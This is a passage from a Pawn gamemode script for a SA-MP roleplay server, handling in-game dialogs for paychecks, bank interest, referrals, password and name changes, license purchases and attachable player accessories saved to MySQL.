            format(string, sizeof(string), "  Paycheck: $%d |  Tax: $%d (%d percent)", PayCheck, TaxCost, TaxPercentage);
            SendClientMessage(playerid, COLOR_GRAD1, string);

			// VIP Disabled
			/*switch(PlayerInfo[i][pVip])
			{
    			case 0:
    			{
        			if(interest > 50000) interest = 50000;
        			format(string, sizeof(string), "  Balance: $%d  |  Interest rate: 0.1 percent (5k max)", PlayerInfo[i][pBank]);
        			SendClientMessage(i, COLOR_GRAD1, string);
    			}
    			case 1:
    			{
   			 		if(interest > 100000) interest = 100000;
					format(string, sizeof(string), "  Balance: $%d  |  Interest rate: 0.1 percent {FFFF00}(Bronze VIP: 100k max)", PlayerInfo[i][pBank]);
					SendClientMessage(i, COLOR_GRAD1, string);
				}
				case 2:
				{
					if(interest > 150000) interest = 150000;
					format(string, sizeof(string), "  Balance: $%d  |  Interest rate: 0.1 percent {FFFF00}(Silver VIP: 150k max)", PlayerInfo[i][pBank]);
					SendClientMessage(i, COLOR_GRAD1, string);
				}
				case 3:
				{
					if(interest > 200000) interest = 200000;
					format(string, sizeof(string), "  Balance: $%d  |  Interest rate: 0.1 percent {FFFF00}(Gold VIP: 200k max)", PlayerInfo[i][pBank]);
					SendClientMessage(i, COLOR_GRAD1, string);
				}
				case 4, 5:
				{
					if(interest > 250000) interest = 250000;
					format(string, sizeof(string), "  Balance: $%d  |  Interest rate: 0.1 percent {FFFF00}(Undefined Donator: 250k max)", PlayerInfo[i][pBank]);
					SendClientMessage(i, COLOR_GRAD1, string);
				}
			}*/

            new interest;
            if(PlayerInfo[playerid][pVip] == 0) interest = PlayerInfo[playerid][pBank] / 1000;
            else if(PlayerInfo[playerid][pVip] == 1) interest = PlayerInfo[playerid][pBank] / 500;
            else if(PlayerInfo[playerid][pVip] == 2) interest = PlayerInfo[playerid][pBank] / 333;
            else if(PlayerInfo[playerid][pVip] == 3) interest = PlayerInfo[playerid][pBank] / 200;

            if(interest > 5000) interest = 5000;

            if(PlayerInfo[playerid][pVip] == 0) format(string, sizeof(string), "  Old balance: $%d  |  Interest rate: 0.1 percent (5k max)", PlayerInfo[playerid][pBank]);
            else if(PlayerInfo[playerid][pVip] == 1) format(string, sizeof(string), "  Old balance: $%d  |  Interest rate: 0.2 percent (5k max)", PlayerInfo[playerid][pBank]);
            else if(PlayerInfo[playerid][pVip] == 2) format(string, sizeof(string), "  Old balance: $%d  |  Interest rate: 0.3 percent (5k max)", PlayerInfo[playerid][pBank]);
            else if(PlayerInfo[playerid][pVip] == 3) format(string, sizeof(string), "  Old balance: $%d  |  Interest rate: 0.5 percent (5k max)", PlayerInfo[playerid][pBank]);

            SendClientMessage(playerid, COLOR_GRAD1, string);

			if(PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pFaction] == 5 || PlayerInfo[playerid][pFaction] == 9) {
				if(PlayerInfo[playerid][pRank] == 0) {
					PlayerInfo[playerid][pBank] += FACTION_PAY_PER_RANK / 2;
					format(string,sizeof(string),"  Faction pay: $%d", FACTION_PAY_PER_RANK / 2);
					SendClientMessage(playerid, COLOR_GRAD2, string);
				} else {
					PlayerInfo[playerid][pBank] += PlayerInfo[playerid][pRank] * FACTION_PAY_PER_RANK;
					format(string,sizeof(string),"  Faction pay: $%d", PlayerInfo[playerid][pRank] * 100);
					SendClientMessage(playerid, COLOR_GRAD2, string);
				}
			}

            //Tax += TaxCost;
            PlayerInfo[playerid][pBank] += PayCheck;
            PlayerInfo[playerid][pBank] += interest;
            PlayerInfo[playerid][pBank] -= TaxCost;

            format(string, sizeof(string), "  Interest gained: $%d", interest);
            SendClientMessage(playerid, COLOR_GRAD3, string);
            SendClientMessage(playerid, COLOR_GRAD4, "______________________________________");
            format(string, sizeof(string), "  New balance: $%d |  Rent paid: $%d", PlayerInfo[playerid][pBank], (PlayerInfo[playerid][pRenting] != INVALID_HOUSE_ID) ? (HouseInfo[PlayerInfo[playerid][pRenting]][hRentFee]) : (0));
            SendClientMessage(playerid, COLOR_GRAD5, string);

            GameTextForPlayer(playerid, "~w~Paycheck received", 5000, 1);

            PlayerInfo[playerid][pPayReady] = 0;
            PlayerInfo[playerid][pPayCheck] = 0;

            #if defined DOUBLE_EXP_ENABLED
				new hour,minuite,second;
				gettime(hour,minuite,second);
				if(DoubleEXPcheck(hour))
				{
				    PlayerInfo[playerid][pRespect] += 2;
				    SendClientMessage(playerid, COLOR_YELLOW, "* You have gained two respect points due to double experience.");
				}
				else
				{
	    			SendClientMessage(playerid, COLOR_YELLOW, "* You have only gained one respect point since it's not within the double experience hours.");
					PlayerInfo[playerid][pRespect]++;
				}
            #else
            	PlayerInfo[playerid][pRespect]++;
            #endif

            PlayerInfo[playerid][pConnectTime]++;
            SignedPaycheck[playerid] = 1;
            MissedPaychecks[playerid] = 0;

            // Referrals
            if(PlayerInfo[playerid][pConnectTime] == 8 && (strlen(PlayerInfo[playerid][pReferredBy]) > 3 && strlen(PlayerInfo[playerid][pReferredBy]) < 20))
            {
            	new giveplayerid = ReturnUser(PlayerInfo[playerid][pReferredBy]);
    	        if(IsPlayerConnected(giveplayerid))
				{
    				PlayerInfo[giveplayerid][pRefTokens]++;
				    format(string, sizeof(string), "Your friend %s, that was referred by you, has just reached 8 playing hours. Therefore you have gained 1 referral token.", GetPlayerNameEx(playerid));
				    SendClientMessage(giveplayerid, COLOR_YELLOW, string);

				    format(string, sizeof(string), "Since you have reached 8 playing hours and were referred by %s, they have gained 1 referral token.", PlayerInfo[playerid][pReferredBy]);
				    SendClientMessage(playerid, COLOR_YELLOW, string);
				}
				else  {
				    /*OnPlayerOfflineLogin(PlayerInfo[playerid][pReferredBy]);
				    PlayerInfo[MAX_PLAYERS][pRefTokensOffline]++;
				    OnPlayerOfflineSave(PlayerInfo[playerid][pReferredBy]);*/

				    new
				        szQuery[128];

					mysql_format(sqldb,szQuery, sizeof(szQuery), "SELECT RefTokensOffline FROM players WHERE Username = '%s'", PlayerInfo[playerid][pReferredBy]);
					mysql_tquery(sqldb,szQuery,"OnQueryFinished","ii", THREAD_GIVE_REF_TOKENS, playerid);
				}
            }
        }
        else
		{
            SendClientMessage(playerid, COLOR_WHITE, "Wrong check code.");
        }
    }
	else if(dialogid == 2398)
	{
	    if(strlen(inputtext) >= 64)
	    {
	        SendClientMessage(playerid, COLOR_WHITE, "You can't select a password that's above 64 characters.");
	    }
	    else
	    {
	        if(strlen(inputtext) >= 1)
	        {
	            if(!response)
	            {
	                SendClientMessage(playerid, COLOR_WHITE, "You have prevented yourself from changing your password.");
	            }
	            else
	            {
					new passbuffer[129];
					WP_Hash(passbuffer, sizeof(passbuffer), inputtext);

	             	format(PlayerInfo[playerid][pKey], 129, "%s", passbuffer);
		            format(string, sizeof(string), "You have changed your password to '%s'", inputtext);

		            SendClientMessage(playerid, COLOR_YELLOW, string);
		            OnPlayerStatsUpdate(playerid);

					format(string, sizeof(string), "%s (IP: %s) has changed their password.", GetPlayerNameEx(playerid), PlayerInfo[playerid][pIP]);
					Log("logs/password.log", string);
	            }
	        }
	        else
	        {
	            SendClientMessage(playerid, COLOR_WHITE, "Your password must be longer than 1 character.");
	        }
	    }
	}
	else if(dialogid == DIALOG_NAMECHANGE)
	{
	    if(!response || strlen(inputtext) == 0) return SendClientMessage(playerid, COLOR_WHITE, "You have prevented yourself from changing your name.");
	    if(strlen(inputtext) > 20)
	    {
	        SendClientMessage(playerid, COLOR_WHITE, "You can't select a name that's above 20 characters.");
	    }
	    else
	    {
	        if(strlen(inputtext) >= 1)
	        {
	            if(!response)
	            {
	                SendClientMessage(playerid, COLOR_WHITE, "You have prevented yourself from changing your name.");
	            }
	            else
	            {
		            for(new i = 0; i < strlen(inputtext); i++)
					{
					    if(inputtext[i] == ' ') return SendClientMessage(playerid, COLOR_GRAD2, "Please use the '_'(underscore) instead of the ' '(space)");
					}
					if(strfind(inputtext, "_", true) == -1)
					{
						SendClientMessage(playerid, COLOR_WHITE, "Name change rejected. Please choose a name in the correct format: Firstname_Lastname.");
						return 1;
					}
					new namechangecost;
					namechangecost = (PlayerInfo[playerid][pLevel]) * 1500;
					SetPVarInt(playerid, "requestpath", 2);
					if(PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pFaction] == 4)
					{
	    				new String[128];
						SetPVarInt(playerid, "RequestingNameChange", 1);
						SetPVarString(playerid, "NewNameRequest", inputtext);
						new playername[MAX_PLAYER_NAME];
						GetPlayerName(playerid, playername, sizeof(playername));
		            	format(String, sizeof(String), "You have requested a namechange from %s to %s at no cost (hitman or FBI), please wait until an admin approves it.", playername, inputtext, namechangecost);
		            	SendClientMessage(playerid, COLOR_YELLOW, String);
		            	format(String, sizeof(String), "{AA3333}AdmWarning{FFFF00}: %s (ID %d) requested a name change to %s for free - /approvename %d (accept), or /denyname %d (deny).", playername, playerid, inputtext, playerid, playerid);
		            	ABroadCast(COLOR_YELLOW, String, 1);
		            	return 1;
					}
					if(GetPlayerCash(playerid) >= namechangecost)
					{
					    new String[128];
						SetPVarInt(playerid, "RequestingNameChange", 1);
						SetPVarString(playerid, "NewNameRequest", inputtext);
						SetPVarInt(playerid, "NameChangeCost", namechangecost);
						new playername[MAX_PLAYER_NAME];
						GetPlayerName(playerid, playername, sizeof(playername));
		            	format(String, sizeof(String), "You have requested a namechange from %s to %s for $%d, please wait until an admin approves it.", playername, inputtext, namechangecost);
		            	SendClientMessage(playerid, COLOR_YELLOW, String);
		            	format(String, sizeof(String), "{AA3333}AdmWarning{FFFF00}: %s (ID %d) requested a name change to %s for $%d - /approvename %d (accept), or /denyname %d (deny).", playername, playerid, inputtext, namechangecost, playerid, playerid);
		            	ABroadCast(COLOR_YELLOW, String, 1);
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money for the name change.");
					}
	            }
	        }
	        else
	        {
	            SendClientMessage(playerid, COLOR_WHITE, "Your name must be longer than 1 character.");
	        }
	    }
	}
	else if(dialogid == DIALOG_NAMECHANGE2)
	{
	    if(!response || strlen(inputtext) == 0) return Kick(playerid);
	    if(strlen(inputtext) >= 20)
	    {
	        SendClientMessage(playerid, COLOR_WHITE, "You can't select a name that's above 20 characters.");
	        ShowPlayerDialogEx(playerid, DIALOG_NAMECHANGE2, DIALOG_STYLE_INPUT, "Free name change","This is a roleplay server where you must have a name in this format: Firstname_Lastname.\nFor example: John_Smith or Jimmy_Johnson\n\nAn admin has offered you to change your name to the correct format for free. Please enter your desired name below.\n\nNote: If you press cancel you will be kicked from the server.", "Change", "Cancel");
	    }
	    else
	    {
	        if(strlen(inputtext) >= 1)
	        {
	            if(!response)
	            {
				    ShowPlayerDialogEx(playerid, DIALOG_NAMECHANGE2, DIALOG_STYLE_INPUT, "Free name change","This is a roleplay server where you must have a name in this format: Firstname_Lastname.\nFor example: John_Smith or Jimmy_Johnson\n\nAn admin has offered you to change your name to the correct format for free. Please enter your desired name below.\n\nNote: If you press cancel you will be kicked from the server.", "Change", "Cancel");
				}
	            else
	            {
           			for(new i = 0; i < strlen(inputtext); i++)
					{
    					if(inputtext[i] == ' ')
    					{
							SendClientMessage(playerid, COLOR_WHITE, "Please use the '_'(underscore) instead of the ' '(space)");
							ShowPlayerDialogEx(playerid, DIALOG_NAMECHANGE2, DIALOG_STYLE_INPUT, "Free name change","This is a roleplay server where you must have a name in this format: Firstname_Lastname.\nFor example: John_Smith or Jimmy_Johnson\n\nAn admin has offered you to change your name to the correct format for free. Please enter your desired name below.\n\nNote: If you press cancel you will be kicked from the server.", "Change", "Cancel");
							return 1;
						}
					}
					if(strfind(inputtext, "_", true) == -1)
					{
						SendClientMessage(playerid, COLOR_WHITE, "Name change rejected. Please choose a name in the correct format: Firstname_Lastname.");
						ShowPlayerDialogEx(playerid, DIALOG_NAMECHANGE2, DIALOG_STYLE_INPUT, "Free name change","This is a roleplay server where you must have a name in this format: Firstname_Lastname.\nFor example: John_Smith or Jimmy_Johnson\n\nAn admin has offered you to change your name to the correct format for free. Please enter your desired name below.\n\nNote: If you press cancel you will be kicked from the server.", "Change", "Cancel");
						return 1;
					}
     				else
					{
						new String[128];
						SetPVarInt(playerid, "RequestingNameChange", 1);
						SetPVarInt(playerid, "NameChangeCost", 0);
						SetPVarString(playerid, "NewNameRequest", inputtext);
						new playername[MAX_PLAYER_NAME];
						GetPlayerName(playerid, playername, sizeof(playername));
    					format(String, sizeof(String), "You have requested a namechange from %s to %s please wait until an admin approves it.", playername, inputtext);
       					SendClientMessage(playerid, COLOR_YELLOW, String);
          				format(String, sizeof(String), "{AA3333}AdmWarning{FFFF00}: %s (ID %d) requested a name change to %s for free (non-RP name) - /approvename %d (accept), or /denyname %d (deny).", playername, playerid, inputtext, playerid, playerid);
            			ABroadCast(COLOR_YELLOW, String, 1);
            			return 1;
            		}
				}
	        }
	        else
	        {
	            SendClientMessage(playerid, COLOR_WHITE, "Your name must be longer than 1 character.");
	            ShowPlayerDialogEx(playerid, DIALOG_NAMECHANGE2, DIALOG_STYLE_INPUT, "Free name change","This is a roleplay server where you must have a name in this format: Firstname_Lastname.\nFor example: John_Smith or Jimmy_Johnson\n\nAn admin has offered you to change your name to the correct format for free. Please enter your desired name below.\n\nNote: If you press cancel you will be kicked from the server.", "Change", "Cancel");
	        }
	    }
	}
	if(dialogid == DIALOG_LICENSE_BUY && response)
	{
		switch (listitem)
		{
			case 0:
			{
			    if(PlayerInfo[playerid][pCarLic] == 0)
			    {
			        if(GetPlayerCash(playerid) < 500)
			        {
			            SendClientMessage(playerid, COLOR_GREY, "You can't afford to buy a driver's license.");
			            return 1;
			        }
					GivePlayerCash(playerid,-500);
					PlayerInfo[playerid][pCarLic] = 1;
					SendClientMessage(playerid, COLOR_GREY, "You have successfully acquired a driver's license.");
				}
				else SendClientMessage(playerid, COLOR_GREY, "You already have a driver's license.");
			}
			case 1:
			{
			    if(PlayerInfo[playerid][pBoatLic] == 0)
			    {
			        if(GetPlayerCash(playerid) < 500)
			        {
			            SendClientMessage(playerid, COLOR_GREY, "You can't afford to buy a boating license.");
			            return 1;
			        }
					GivePlayerCash(playerid,-500);
					PlayerInfo[playerid][pBoatLic] = 1;
					SendClientMessage(playerid, COLOR_GREY, "You have successfully acquired a boating license.");
				}
				else SendClientMessage(playerid, COLOR_GREY, "You already have a boating license.");
			}
			case 2:
			{
			    if(PlayerInfo[playerid][pFlyLic] == 0)
			    {
			    	if(PlayerInfo[playerid][pLevel] >=2) // FOR LATER SETTING POSSIBLY
			    	{
			    	    if(GetPlayerCash(playerid) < 2500)
			        	{
			            	SendClientMessage(playerid, COLOR_GREY, "You can't afford to buy a pilot's license.");
			            	return 1;
			        	}
						GivePlayerCash(playerid,-2500);
						PlayerInfo[playerid][pFlyLic] = 1;
      					SendClientMessage(playerid, COLOR_GREY, "You have successfully acquired a pilot license; you will now be able to pilot aircraft.");
					}
					else SendClientMessage(playerid, COLOR_GREY, "You must be level 2 or above to acquire a pilot license.");
				}
                else SendClientMessage(playerid, COLOR_GREY, "You already have a pilot license.");
			}
		}
	}
 	if(dialogid == FAMILYSKINDIALOG)
    {
        if(response)
	    {
   			if(listitem == 0)
      		{
        		SetFamilySkin(playerid, 0);
      		}
   			if(listitem == 1)
      		{
                SetFamilySkin(playerid, 1);
      		}
   			if(listitem == 2)
      		{
                SetFamilySkin(playerid, 2);
      		}
   			if(listitem == 3)
      		{
                SetFamilySkin(playerid, 3);
      		}
			if(listitem == 4)
      		{
                SetFamilySkin(playerid, 4);
      		}
			if(listitem == 5)
      		{
                SetFamilySkin(playerid, 5);
      		}
			if(listitem == 6)
      		{
                SetFamilySkin(playerid, 6);
      		}
			if(listitem == 7)
      		{
                SetFamilySkin(playerid, 7);
      		}
	    }
	 }
	if((dialogid == BUYTOYS) && response)
	{
	    new stringg[856];
		for(new x;x<MAX_PLAYERTOYS;x++)
		{
  			new name[24];
	    	format(name, sizeof(name), "None");

			for(new i;i<sizeof(HoldingObjectsAll);i++)
   			{
				if(HoldingObjectsAll[i][holdingmodelid] == PlayerToyInfo[playerid][x][ptModelID])
    			{
   					format(name, sizeof(name), "%s", HoldingObjectsAll[i][holdingmodelname]);
				}
			}

			format(stringg, sizeof(stringg), "%s(%d) %s (Bone: %s)\n", stringg, x, name, HoldingBones[PlayerToyInfo[playerid][x][ptBone]]);
		}
		ShowPlayerDialogEx(playerid, BUYTOYS2, DIALOG_STYLE_LIST, "Select a Slot", stringg, "Select", "Cancel");
	}
	if((dialogid == BUYTOYS2) && response)
	{
	    if(listitem == 5 && PlayerInfo[playerid][pVip] < 1) return SendClientMessage(playerid, COLOR_WHITE, "* You must be a Bronze VIP to use that slot!");
	    if(listitem == 6 && PlayerInfo[playerid][pVip] < 2) return SendClientMessage(playerid, COLOR_WHITE, "* You must be a Silver VIP to use that slot!");
        if(listitem == 7 && PlayerInfo[playerid][pVip] < 3) return SendClientMessage(playerid, COLOR_WHITE, "* You must be a Gold VIP to use that slot!");

	    if(PlayerToyInfo[playerid][listitem][ptModelID] != 0) return SendClientMessage(playerid, COLOR_YELLOW, "* You already have something in that slot. Delete it with /toys");

		slotselection[playerid] = listitem;

		new stringg[4000];
		for(new x;x<sizeof(HoldingObjects);x++)
		{
		    format(stringg, sizeof(stringg), "%s%s ($%d)\n", stringg, HoldingObjects[x][holdingmodelname], HoldingObjects[x][holdingprice]);
		}
		ShowPlayerDialogEx(playerid, BUYTOYS3, DIALOG_STYLE_LIST, "Select an Item", stringg, "Buy", "Cancel");
	}
	if((dialogid == BUYTOYS3) && response)
	{
		if(GetPlayerCash(playerid) < HoldingObjects[listitem][holdingprice])
		{
		    SendClientMessage(playerid, COLOR_WHITE, "* You can't afford that!");
		}
		else
		{
			GivePlayerCash(playerid, -HoldingObjects[listitem][holdingprice]);
		    PlayerToyInfo[playerid][slotselection[playerid]][ptModelID] = HoldingObjects[listitem][holdingmodelid];

		    new modelid = PlayerToyInfo[playerid][slotselection[playerid]][ptModelID];
		    if((modelid >= 19006 && modelid <= 19035) || (modelid >= 19138 && modelid <= 19140))
		    {
		        PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 2;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = 0.9;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = 0.35;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = 90.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = 90.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = 0.0;
		    }
		    else if(modelid >= 18891 && modelid <= 18910)
		    {
		    	PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 2;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = 0.15;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = 90.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = 180.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = 90.0;
			}
			else if(modelid >= 18926 && modelid <= 18935)
			{
				PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 2;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = 0.1;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = 0.0;
			}
			else if(modelid >= 18911 && modelid <= 18920)
			{
			    PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 2;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = 0.1;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = 0.035;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = 90.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = 180.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = 90.0;
			}
			else if(modelid == 19078 || modelid == 19078)
			{
			    PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 16;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = 0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = 0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = 0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = 180.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = 180.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = 0.0;
			}
			else if((modelid >= 18641 && modelid <= 18644) || (modelid >= 19080 && modelid <= 19084) || modelid == 18890)
			{
			    PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 6;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = 0.0;
			}
		    else
		    {
				PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 2;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = 0.0;
			}
			PlayerToyInfo[playerid][slotselection[playerid]][ptScaleX] = 1.0;
			PlayerToyInfo[playerid][slotselection[playerid]][ptScaleY] = 1.0;
			PlayerToyInfo[playerid][slotselection[playerid]][ptScaleZ] = 1.0;

			new
			    szQuery[460];
			mysql_format(sqldb,szQuery, sizeof(szQuery),"INSERT INTO toys (Owner, ModelID, Bone, PosX, PosY, PosZ, RotX, RotY, RotZ, ScaX, ScaY, ScaZ) VALUES(%d, %d, %d, '%f', '%f', '%f', '%f', '%f', '%f', '%f', '%f', '%f')",
			PlayerInfo[playerid][pID], PlayerToyInfo[playerid][slotselection[playerid]][ptModelID], PlayerToyInfo[playerid][slotselection[playerid]][ptPosX], PlayerToyInfo[playerid][slotselection[playerid]][ptPosY], PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ],
			PlayerToyInfo[playerid][slotselection[playerid]][ptRotX], PlayerToyInfo[playerid][slotselection[playerid]][ptRotY], PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ], PlayerToyInfo[playerid][slotselection[playerid]][ptScaleX], PlayerToyInfo[playerid][slotselection[playerid]][ptScaleY],
			PlayerToyInfo[playerid][slotselection[playerid]][ptScaleZ]);
			mysql_tquery(sqldb,szQuery);
			// PlayerToyInfo[playerid][slotselection[playerid]][ptRealID] = mysql_insert_id();

			format(string, sizeof(string), "* You have purchased %s for $%d (Slot: %d)", HoldingObjects[listitem][holdingmodelname], HoldingObjects[listitem][holdingprice], slotselection[playerid]);
		    SendClientMessage(playerid, COLOR_RED, string);
		    SendClientMessage(playerid, COLOR_WHITE, "HINT: Use /toys to wear/edit this");
		}
	}
	if((dialogid == TOYS) && response)
	{
		if(listitem == 0)
		{
		    new stringg[856];
			for(new x;x<MAX_PLAYERTOYS;x++)
			{
			    new name[64];
			    format(name, sizeof(name), "None");

			    for(new i;i<sizeof(HoldingObjectsAll);i++)
			    {
       				if(HoldingObjectsAll[i][holdingmodelid] == PlayerToyInfo[playerid][x][ptModelID])
			        {
           				format(name, sizeof(name), "%s", HoldingObjectsAll[i][holdingmodelname]);
					}
				}

				format(stringg, sizeof(stringg), "%s(%d) %s (Bone: %s)\n", stringg, x, name, HoldingBones[PlayerToyInfo[playerid][x][ptBone]]);
			}
   			ShowPlayerDialogEx(playerid, WEARTOY, DIALOG_STYLE_LIST, "Select a Toy", stringg, "Select", "Cancel");
	    }
		else if(listitem == 1)
		{
		    new stringg[856];
			for(new x;x<MAX_PLAYERTOYS;x++)
			{
			    new name[24];
			    format(name, sizeof(name), "None");

			    for(new i;i<sizeof(HoldingObjectsAll);i++)
			    {
       				if(HoldingObjectsAll[i][holdingmodelid] == PlayerToyInfo[playerid][x][ptModelID])
			        {
           				format(name, sizeof(name), "%s", HoldingObjectsAll[i][holdingmodelname]);
					}
				}

				format(stringg, sizeof(stringg), "%s(%d) %s (Bone: %s)\n", stringg, x, name, HoldingBones[PlayerToyInfo[playerid][x][ptBone]]);
			}
   			ShowPlayerDialogEx(playerid, EDITTOYS, DIALOG_STYLE_LIST, "Select a Toy", stringg, "Select", "Cancel");
   		}
		else if(listitem == 2)
		{
		    new stringg[856];
			for(new x;x<MAX_PLAYERTOYS;x++)
			{
			    new name[24];
			    format(name, sizeof(name), "None");

			    for(new i;i<sizeof(HoldingObjectsAll);i++)
			    {
       				if(HoldingObjectsAll[i][holdingmodelid] == PlayerToyInfo[playerid][x][ptModelID])
			        {
           				format(name, sizeof(name), "%s", HoldingObjectsAll[i][holdingmodelname]);
					}
				}

				format(stringg, sizeof(stringg), "%s(%d) %s (Bone: %s)\n", stringg, x, name, HoldingBones[PlayerToyInfo[playerid][x][ptBone]]);
			}
   			ShowPlayerDialogEx(playerid, DELETETOY, DIALOG_STYLE_LIST, "Select a Toy", stringg, "Delete", "Cancel");
		}
	}

	if((dialogid == EDITTOYS) && response) {
	    if(PlayerToyInfo[playerid][listitem][ptModelID] == 0) {
	        ShowPlayerDialogEx(playerid, 0, DIALOG_STYLE_MSGBOX, "Toy Menu: Edit", "Whoops! You don't have anything on that slot", "OK", "");
		}
		else {
		    slotselection[playerid] = listitem;
		    ShowEditMenu(playerid);
		}
	}
	if((dialogid == EDITTOYS2)) {
	    if(response) switch(listitem) {
		    case 0: ShowPlayerDialogEx(playerid, EDITTOYSBONE, DIALOG_STYLE_LIST, "Select a Bone", "Spine\nHead\nLeft upper arm\nRight upper arm\nLeft hand\nRight hand\nLeft thigh\nRight thigh\nLeft foot\nRight foot\nRight calf\nLeft calf\nLeft forearm\nRight forearm\nLeft clavicle\nRight clavicle\nNeck\nJaw", "Select", "Cancel");
		    case 1: EditAttachedObject(playerid, slotselection[playerid]);
		}
		else
		{
		    new stringg[856];
			for(new x;x<MAX_PLAYERTOYS;x++)
			{
			    new name[24];
			    format(name, sizeof(name), "None");

			    for(new i;i<sizeof(HoldingObjectsAll);i++)
			    {
       				if(HoldingObjectsAll[i][holdingmodelid] == PlayerToyInfo[playerid][x][ptModelID])
			        {
           				format(name, sizeof(name), "%s", HoldingObjectsAll[i][holdingmodelname]);
					}
				}

				format(stringg, sizeof(stringg), "%s(%d) %s (Bone: %s)\n", stringg, x, name, HoldingBones[PlayerToyInfo[playerid][x][ptBone]]);
			}
   			ShowPlayerDialogEx(playerid, EDITTOYS, DIALOG_STYLE_LIST, "Select a Toy", stringg, "Select", "Cancel");
		}
	}
	/* if(dialogid == EDITTOYSSX)
	{
	    if(response)
	    {
	        new Float:offset = floatstr(inputtext);
	        if(offset < 0.1) offset = 0.1;
			else if(offset > 1.5) offset = 1.5;
	        PlayerToyInfo[playerid][slotselection[playerid]][ptScaleX] = offset;
		}
		ShowEditMenu(playerid);
	}
	if(dialogid == EDITTOYSSY)
	{
	    if(response)
	    {
	        new Float:offset = floatstr(inputtext);
	        if(offset < 0.1) offset = 0.1;
			else if(offset > 1.5) offset = 1.5;
	        PlayerToyInfo[playerid][slotselection[playerid]][ptScaleY] = offset;
		}
		ShowEditMenu(playerid);
	}
	if(dialogid == EDITTOYSSZ)
	{
	    if(response)
	    {
	        new Float:offset = floatstr(inputtext);
	        if(offset < 0.1) offset = 0.1;
			else if(offset > 1.5) offset = 1.5;
	        PlayerToyInfo[playerid][slotselection[playerid]][ptScaleZ] = offset;
		}
		ShowEditMenu(playerid);
	}
	if(dialogid == EDITTOYSPX)
	{
	    if(response)
	    {
	        new Float:offset = floatstr(inputtext);
	        if(offset < -100) offset = 0;
			else if(offset > 100) offset = 100;
	        offset = offset/100;
	        PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = offset;
		}
		ShowEditMenu(playerid);
	}
	if(dialogid == EDITTOYSPY)
	{
	    if(response)
	    {
	        new Float:offset = floatstr(inputtext);
     		if(offset < -100) offset = 0;
			else if(offset > 100) offset = 100;
	        offset = offset/100;
	        PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = offset;
		}
		ShowEditMenu(playerid);
	}
	if(dialogid == EDITTOYSPZ)
	{
	    if(response)
	    {
	        new Float:offset = floatstr(inputtext);
	        if(offset < -100) offset = 0;
			else if(offset > 100) offset = 100;
			offset = offset/100;
	        PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = offset;
		}
		ShowEditMenu(playerid);
	}
	if(dialogid == EDITTOYSRX)
	{
	    if(response)
	    {
	        new Float:offset = floatstr(inputtext);
	        if(offset < -100) offset = 0;
			else if(offset > 360) offset = 360;
	        PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = offset;
		}
		ShowEditMenu(playerid);
	}
	if(dialogid == EDITTOYSRY)
	{
	    if(response)
	    {
